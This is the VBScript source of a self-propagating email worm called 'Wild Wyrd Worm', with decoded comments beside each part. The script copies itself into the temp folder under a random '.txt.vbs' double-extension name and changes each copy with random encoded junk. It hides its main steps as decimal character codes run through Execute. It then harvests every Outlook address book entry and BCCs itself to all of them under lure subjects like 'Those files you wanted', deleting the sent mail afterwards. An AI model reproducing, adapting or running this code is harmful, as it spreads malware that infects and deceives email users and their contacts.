   On Error Resume Next

   'Wild Wyrd Worm - Hope no harm done

   Dim fso, f, DirWindows, DirSystem, DirTemp, WinShell, DirTempf, AddOld, OldSubject
   Dim scriptPath, scriptFile, scriptCopy, scriptText, scriptEncoded, myEncoder
   Dim x, AddressList, AddressBooks, AddressEntries, Recipients
   Dim objMAPI, objOutlook, objMessage
   Dim objMAPIFolder, objDelMail
   Dim strSubject, strScriptHead
   Dim strSubjectA(5), strSubjectB, sMCode, strFin
   strSubjectA(0) = DecodeNum("82 101 58 32 84 104 111 115 101 32 102 105 108 101 115 32 121 111 117 32 119 97 110 116 101 100", False)
   ' Re: Those files you wanted
   strSubjectA(1) = DecodeNum("70 119 58 32 67 104 101 99 107 32 116 104 105 115 32 111 117 116 33", False)
   ' Fw: Check this out!
   strSubjectA(2) = DecodeNum("67 104 101 99 107 32 116 104 105 115 32 111 117 116 33", False)
   ' Check this out!
   strSubjectA(3) = DecodeNum("72 105 46", False)
   ' Hi.
   strSubjectA(4) = DecodeNum("72 105 33 32 84 104 111 115 101 32 102 105 108 101 115 32 121 111 117 32 119 97 110 116 101 100 46 46 46", False)
   ' Hi! Those files you wanted...
   strSubjectA(5) = DecodeNum("72 105 46 32 84 104 101 115 101 32 97 114 101 32 116 104 101 32 102 105 108 101 115 32 121 111 117 32 97 115 107 101 100 32 102 111 114 44 32 99 104 101 99 107 32 116 104 101 109 32 111 117 116", False)
   ' Hi. These are the files you asked for, check them out
   Randomize
   strSubjectB = Int((Rnd*5)+1)
   strSubject = strSubjectA(strSubjectB)
   Dim rndFileName, lP
   For lP = 1 To 15
       Randomize
       rndFileName = rndFileName & Int((Rnd*lp)+1)
   Next
   Const ForReading = 1
   Const ForWriting = 2
   Const olFolderDeletedItems = 3
   Const olFolderInbox = 6
   Const olMailItem = 0
   Const olImportanceHigh = 2
   Const olFolderSentMail = 5
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set WinShell = CreateObject("WScript.Shell")
   Set DirWindows = fso.GetSpecialFolder(0)
   Set DirSystem = fso.GetSpecialFolder(1)
   Set DirTemp = fso.GetSpecialFolder(2)
   scriptPath = DirTemp & Mid(strSubject, 1, 3) & rndFileName & ".txt.vbs"

   Function DecodeNum(lSequence, bEncode)
   Dim i, sOutput, sTOutput
   If bEncode = True then
       For i = 1 To Len(lSequence)
           sTOutput = Asc(Mid(lSequence, i, 1))
           sOutput = sOutput & sTOutput & " "
       Next
       DecodeNum = Trim(sOutput)
   Else
       sTOutput = Split(lSequence, " ")
       For i = 0 To UBound(sTOutput)
           sOutput = sOutput & Chr(sTOutput(i))
       Next
       DecodeNum = sOutput
   End if
   End Function

   sMCode = DecodeNum("83 101 116 32 115 99 114 105 112 116 70 105 108 101 32 61 32 102 115 111 46 79 112 101 110 84 101 120 116 70 105 108 101 40 87 83 99 114 105 112 116 46 83 99 114 105 112 116 70 117 108 108 110 97 109 101 44 32 49 41 13 10 115 99 114 105 112 116 84 101 120 116 32 61 32 115 99 114 105 112 116 70 105 108 101 46 82 101 97 100 65 108 108 13 10 83 101 116 32 115 99 114 105 112 116 67 111 112 121 32 61 32 102 115 111 46 67 114 101 97 116 101 84 101 120 116 70 105 108 101 40 115 99 114 105 112 116 80 97 116 104 44 32 84 114 117 101 41 13 10 115 99 114 105 112 116 67 111 112 121 46 87 114 105 116 101 32 115 99 114 105 112 116 84 101 120 116 13 10 115 99 114 105 112 116 67 111 112 121 46 87 114 105 116 101 32 118 98 78 101 119 76 105 110 101 13 10 68 105 109 32 114 97 110 100 118 97 114 44 32 114 97 110 100 115 116 114 105 110 103 44 32 114 108 44 32 114 105 44 32 114 97 13 10 114 97 110 100 118 97 114 32 61 32 102 115 111 46 71 101 116 84 101 109 112 78 97 109 101 58 32 114 97 110 100 118 97 114 32 61 32 77 105 100 40 114 97 110 100 118 97 114 44 32 49 44 32 76 101 110 40 114 97 110 100 118 97 114 41 32 45 32 52 41 13 10 114 97 32 61 32 73 110 116 40 40 56 48 32 42 32 82 110 100 41 43 49 41 13 10 70 111 114 32 114 108 32 61 32 49 32 84 111 32 114 97 13 10 32 32 32 32 82 97 110 100 111 109 105 122 101 13 10 32 32 32 32 114 105 32 61 32 67 104 114 40 73 110 116 40 40 50 53 52 32 42 32 82 110 100 41 32 43 32 49 41 41 13 10 32 32 32 32 114 97 110 100 115 116 114 105 110 103 32 61 32 114 97 110 100 115 116 114 105 110 103 32 38 32 114 105 13 10 78 101 120 116 13 10 114 97 110 100 115 116 114 105 110 103 32 61 32 68 101 99 111 100 101 78 117 109 40 114 97 110 100 115 116 114 105 110 103 44 32 84 114 117 101 41 13 10 114 97 110 100 115 116 114 105 110 103 32 61 32 34 39 115 77 67 111 100 101 32 61 32 68 101 99 111 100 101 78 117 109 40 34 34 34 32 38 32 114 97 110 100 115 116 114 105 110 103 32 38 32 34 34 34 41 39 32 58 32 69 120 101 99 117 116 101 32 115 77 67 111 100 101 34 13 10 115 99 114 105 112 116 67 111 112 121 46 87 114 105 116 101 32 114 97 110 100 115 116 114 105 110 103 13 10 115 99 114 105 112 116 67 111 112 121 46 67 108 111 115 101", False) : Execute sMCode
   ' Set scriptFile = fso.OpenTextFile(WScript.ScriptFullname, 1)
   ' scriptText = scriptFile.ReadAll
   ' Set scriptCopy = fso.CreateTextFile(scriptPath, True)
   ' scriptCopy.Write scriptText
   ' scriptCopy.Write vbNewLine
   ' Dim randvar, randstring, rl, ri, ra
   ' randvar = fso.GetTempName: randvar = Mid(randvar, 1, Len(randvar) - 4)
   ' ra = Int((80 * Rnd)+1)
   ' For rl = 1 To ra
   '     Randomize
   '     ri = Chr(Int((254 * Rnd) + 1))
   '     randstring = randstring & ri
   ' Next
   ' randstring = DecodeNum(randstring, True)
   ' randstring = "'sMCode = DecodeNum(""" & randstring & """)' : Execute sMCode"
   ' scriptCopy.Write randstring
   ' scriptCopy.Close

   sMCode = DecodeNum("83 101 116 32 111 98 106 79 117 116 76 111 111 107 32 61 32 87 83 99 114 105 112 116 46 67 114 101 97 116 101 79 98 106 101 99 116 40 34 79 117 116 108 111 111 107 46 65 112 112 108 105 99 97 116 105 111 110 34 41 13 10 83 101 116 32 111 98 106 77 65 80 73 32 61 32 111 98 106 79 117 116 76 111 111 107 46 71 101 116 78 97 109 101 83 112 97 99 101 40 34 77 65 80 73 34 41 13 10 13 10 70 111 114 32 65 100 100 114 101 115 115 66 111 111 107 115 32 61 32 49 32 84 111 32 111 98 106 77 65 80 73 46 65 100 100 114 101 115 115 76 105 115 116 115 46 67 111 117 110 116 13 10 9 83 101 116 32 65 100 100 114 101 115 115 76 105 115 116 32 61 32 111 98 106 77 65 80 73 46 65 100 100 114 101 115 115 76 105 115 116 115 40 65 100 100 114 101 115 115 66 111 111 107 115 41 13 10 9 120 32 61 32 49 13 10 9 102 111 114 32 65 100 100 114 101 115 115 69 110 116 114 105 101 115 32 61 32 49 32 116 111 32 65 100 100 114 101 115 115 76 105 115 116 46 65 100 100 114 101 115 115 69 110 116 114 105 101 115 46 67 111 117 110 116 13 10 9 9 82 101 99 105 112 105 101 110 116 115 32 61 32 65 100 100 114 101 115 115 76 105 115 116 46 65 100 100 114 101 115 115 69 110 116 114 105 101 115 40 120 41 32 32 38 32 34 59 34 32 38 32 82 101 99 105 112 105 101 110 116 115 13 10 9 9 120 32 61 32 120 32 43 32 49 13 10 9 78 101 120 116 13 10 78 101 120 116 13 10 13 10 83 101 116 32 111 98 106 77 101 115 115 97 103 101 32 61 32 111 98 106 79 117 116 76 111 111 107 46 67 114 101 97 116 101 73 116 101 109 40 111 108 77 97 105 108 73 116 101 109 41 13 10 13 10 87 105 116 104 32 111 98 106 77 101 115 115 97 103 101 13 10 46 98 99 99 32 61 32 82 101 99 105 112 105 101 110 116 115 13 10 46 83 117 98 106 101 99 116 32 61 32 115 116 114 83 117 98 106 101 99 116 13 10 46 68 101 108 101 116 101 65 102 116 101 114 83 117 98 109 105 116 32 61 32 84 114 117 101 13 10 87 105 116 104 32 46 65 116 116 97 99 104 109 101 110 116 115 46 65 100 100 40 115 99 114 105 112 116 80 97 116 104 41 13 10 46 68 105 115 112 108 97 121 78 97 109 101 32 61 32 34 67 104 101 99 107 32 116 104 105 115 32 111 117 116 33 34 13 10 69 110 100 32 87 105 116 104 13 10 46 73 109 112 111 114 116 97 110 99 101 32 61 32 111 108 73 109 112 111 114 116 97 110 99 101 72 105 103 104 13 10 46 72 84 77 76 66 111 100 121 32 61 32 115 116 114 72 84 77 76 66 111 100 121 13 10 46 66 111 100 121 32 61 32 115 116 114 83 117 98 106 101 99 116 13 10 46 83 101 110 100 13 10 69 110 100 32 87 105 116 104 13 10 13 10 102 115 111 46 68 101 108 101 116 101 70 105 108 101 40 115 99 114 105 112 116 80 97 116 104 41 13 10 83 101 116 32 111 98 106 77 101 115 115 97 103 101 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 111 98 106 79 117 116 76 111 111 107 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 111 98 106 77 65 80 73 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 111 98 106 77 65 80 73 70 111 108 100 101 114 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 111 98 106 68 101 108 77 97 105 108 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 102 115 111 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 87 105 110 83 104 101 108 108 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 68 105 114 87 105 110 100 111 119 115 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 68 105 114 83 121 115 116 101 109 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 115 99 114 105 112 116 80 97 116 104 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 115 99 114 105 112 116 70 105 108 101 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 115 99 114 105 112 116 84 101 120 116 32 61 32 78 111 116 104 105 110 103 13 10 83 101 116 32 115 99 114 105 112 116 69 110 99 111 100 101 100 32 61 32 78 111 116 104 105 110 103", False) : Execute sMCode
   ' Set objOutLook = WScript.CreateObject("Outlook.Application")
   ' Set objMAPI = objOutLook.GetNameSpace("MAPI")

   ' For AddressBooks = 1 To objMAPI.AddressLists.Count
   '   Set AddressList = objMAPI.AddressLists(AddressBooks)
   '   x = 1
   '   for AddressEntries = 1 to AddressList.AddressEntries.Count
   '       Recipients = AddressList.AddressEntries(x)  & ";" & Recipients
   '       x = x + 1
   '   Next
   ' Next

   ' Set objMessage = objOutLook.CreateItem(olMailItem)

   ' With objMessage
   ' .bcc = Recipients
   ' .Subject = strSubject
   ' .DeleteAfterSubmit = True
   ' With .Attachments.Add(scriptPath)
   ' .DisplayName = "Check this out!"
   ' End With
   ' .Importance = olImportanceHigh
   ' .HTMLBody = strHTMLBody
   ' .Body = strSubject
   ' .Send
   ' End With

   ' fso.DeleteFile(scriptPath)
   ' Set objMessage = Nothing
   ' Set objOutLook = Nothing
   ' Set objMAPI = Nothing
   ' Set objMAPIFolder = Nothing
   ' Set objDelMail = Nothing
   ' Set fso = Nothing
   ' Set WinShell = Nothing
   ' Set DirWindows = Nothing
   ' Set DirSystem = Nothing
   ' Set scriptPath = Nothing
   ' Set scriptFile = Nothing
   ' Set scriptText = Nothing
   ' Set scriptEncoded = Nothing
